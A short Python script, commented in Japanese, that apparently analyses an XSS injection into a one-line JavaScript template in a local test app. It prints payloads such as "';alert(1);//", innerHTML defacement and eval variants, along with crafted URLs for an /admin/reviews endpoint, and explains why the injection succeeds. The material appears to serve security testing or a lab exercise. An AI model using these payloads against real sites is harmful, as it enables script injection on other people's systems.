#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
1行JavaScript構造でのXSS攻撃テスト
"""

import urllib.parse

def test_single_line_xss():
    print("🔍 1行JavaScript構造でのXSS攻撃分析")
    print("=" * 60)
    
    print("\n📋 修正後のJavaScript構造:")
    template = "console.log('{{ comment }}');var msg='{{ comment }}';setTimeout(function(){showNotification('コメント：'+'{{ comment }}'+'を書き込みました。');},100);function showNotification(message){...}"
    print(f"テンプレート: {template}")
    print()
    
    # テストペイロード
    payload = "';alert(1);//"
    print(f"🎯 テストペイロード: {payload}")
    print(f"URLエンコード: {urllib.parse.quote(payload)}")
    print()
    
    # 生成されるJavaScript
    generated = f"console.log('{payload}');var msg='{payload}';setTimeout(function(){{showNotification('コメント：'+'{payload}'+'を書き込みました。');}},100);function showNotification(message){{...}}"
    print("📝 生成されるJavaScript:")
    print(generated)
    print()
    
    # 実際の実行結果
    print("🔍 実行分析:")
    print("-" * 50)
    print("1. console.log('');alert(1);//');")
    print("   ✅ alert(1) 実行")
    print("   ✅ 以降すべてコメント化")
    print()
    print("2. var msg=... 以降はすべてコメント内")
    print("   ✅ setTimeout(), function定義も無効化")
    print()
    
    print("🎉 成功条件:")
    print("-" * 50)
    print("✅ alert(1) が実行される")
    print("✅ showNotification関数定義が無効化される")
    print("✅ エラーが発生しない")
    print()
    
    # 他のペイロードも試す
    print("🎯 追加テストペイロード:")
    print("-" * 50)
    
    payloads = [
        "';alert('XSS');//",
        "';document.body.innerHTML='<h1>XSS</h1>';//",
        "';eval('alert(1)');//"
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"{i}. {p}")
        print(f"   URL: http://localhost:5000/admin/reviews?updated_comment={urllib.parse.quote(p)}")
    
    print("\n🎯 最終結論:")
    print("=" * 60)
    print("✅ 1行構造により // コメント化が効果的に機能")
    print("✅ showNotification関数定義も無効化される")
    print("✅ 実用的なXSS攻撃が可能")

if __name__ == "__main__":
    test_single_line_xss()